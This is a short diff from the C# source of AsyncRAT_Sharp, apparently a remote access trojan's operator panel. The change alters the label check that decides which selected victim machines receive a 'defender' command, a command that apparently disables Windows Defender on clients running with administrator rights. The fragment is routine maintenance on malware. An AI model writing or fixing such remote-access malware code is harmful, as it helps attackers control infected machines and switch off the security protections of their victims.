@@ -778,7 +778,7 @@ namespace AsyncRAT_Sharp
                         msgpack.ForcePathObject("Packet").AsString = "defender";
                         foreach (ListViewItem itm in listView1.SelectedItems)
                         {
-                            if (itm.SubItems[lv_admin.Index].Text == "Administrator")
+                            if (itm.SubItems[lv_admin.Index].Text == "Admin")
                             {
                                 Clients client = (Clients)itm.Tag;
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
